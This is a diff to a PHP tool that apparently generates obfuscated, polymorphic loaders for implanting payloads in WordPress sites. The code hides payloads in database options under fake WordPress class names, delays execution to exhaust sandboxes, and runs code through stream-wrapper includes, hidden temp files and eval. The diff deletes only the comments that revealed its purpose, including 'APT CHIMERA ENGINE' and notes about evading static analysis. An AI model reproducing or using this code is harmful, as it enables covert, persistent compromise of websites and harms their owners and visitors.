@@ -170,10 +170,6 @@ function _dl($url) {
     return false;
 }
 
-// ==========================================
-// CORE DEPLOYMENT LOGIC (APT CHIMERA ENGINE)
-// ==========================================
-
 foreach ($targets as $t) {
     $url = $t[0]; $fname = $t[1]; $dbkey = $t[2];
 
@@ -185,11 +181,9 @@ foreach ($targets as $t) {
     $enc_data = base64_encode(_xor(gzdeflate($raw, 9), $xor_key));
     $status_ok = false;
 
-    // --- POLYMORPHIC GENERATION START ---
     $cls_stream = 'Stream_' . _rnd(7);
     $proto = 'sys' . rand(10, 99);
     
-    // Variables for Stream Class
     $p_pos = _polyVar(); $p_dat = _polyVar(); $p_len = _polyVar(); $p_ret = _polyVar();
     
     $stream_class_def = <<<PHP
@@ -205,22 +199,18 @@ if(!class_exists('$cls_stream')){
 }
 PHP;
 
-    // Variables for Exec Engine
     $p_fless = _polyVar(); $p_tmp = _polyVar(); $p_cb = _polyVar(); $p_dec = _polyVar();
     $p_arr = _polyVar(); $sbx_loop = _polyVar('s_'); $sbx_hash = _polyVar('h_');
     
-    // APT LOGIC: Sandbox Exhaustion + Stack Trace Fragmentation via C-Native Callbacks (array_walk/array_map)
     $exec_engine = <<<PHP
-        // Dynamic Sandbox Time-Bomb (Exhausts micro-sandbox execution time)
         \$$sbx_hash = '';
         for(\$$sbx_loop = 0; \$$sbx_loop < 300000; \$$sbx_loop++) { \$$sbx_hash = md5((string)\$$sbx_loop); }
 
-        // Execution Engine
         \$$p_fless = false;
         if(in_array('$proto', stream_get_wrappers()) || @stream_wrapper_register('$proto', '$cls_stream')){
             \$GLOBALS['_V_SYS'] = \$$p_dec;
             
-            // Stack Trace Fragmentation (Hides Include inside array_walk C-hook)
+        
             \$$p_cb = function(\$val, \$key) use (&\$$p_fless) {
                 if (\$val === 'execute_core_task') {
                     if((@include('$proto://run')) !== false) { \$$p_fless = true; }
@@ -232,15 +222,12 @@ PHP;
             unset(\$GLOBALS['_V_SYS']);
         }
         
-        // Advanced Fallbacks
         if(!\$$p_fless){
             \$$p_tmp = sys_get_temp_dir() . '/.' . md5(uniqid()) . '.sys';
             if(@file_put_contents(\$$p_tmp, \$$p_dec)){
-                // Native callback proxy
                 \$proxy_func = function() use (\$$p_tmp) { @include(\$$p_tmp); @unlink(\$$p_tmp); };
                 @call_user_func(\$proxy_func);
             } else {
-                // Closure eval hidden through array_map C-hook
                 \$proxy_eval = function(\$code) { eval('?>' . \$code); };
                 @array_map(\$proxy_eval, [\$$p_dec]);
             }
@@ -274,11 +261,9 @@ PHP;
             }
             
             if($stmt) {
-                // Randomize Base WP Class
                 $wp_bases = ['Wp_Http_Response_Cache', 'Wp_Option_Buffer_Sync', 'Wp_Rest_Router_Sys'];
                 $cls = $wp_bases[array_rand($wp_bases)] . '_' . _rnd(4);
                 
-                // Randomize WordPress Decoder variables
                 $v_m = _polyVar(); $v_q = _polyVar(); $v_cfg = _polyVar(); $v_raw = _polyVar(); 
                 $v_k = _polyVar(); $v_r = _polyVar(); $v_row = _polyVar(); $v_bin = _polyVar(); 
                 $v_key = _polyVar(); $v_out = _polyVar(); $v_l = _polyVar(); $v_kl = _polyVar(); $v_i = _polyVar();
@@ -306,7 +291,6 @@ class $cls {
             if(\$$v_r && \$$v_row = \$$v_r->fetch_assoc()) \$$v_raw .= \$$v_row['option_value'];
         }
         
-        // Indirect function calls to evade static analysis hooks
         \$$v_b64 = 'base' . '64' . '_decode'; \$$v_gzin = 'gzin' . 'flate';
         \$$v_bin = \$$v_b64(\$$v_raw); \$$v_key = \$$v_b64(\$$v_cfg['k']);
         
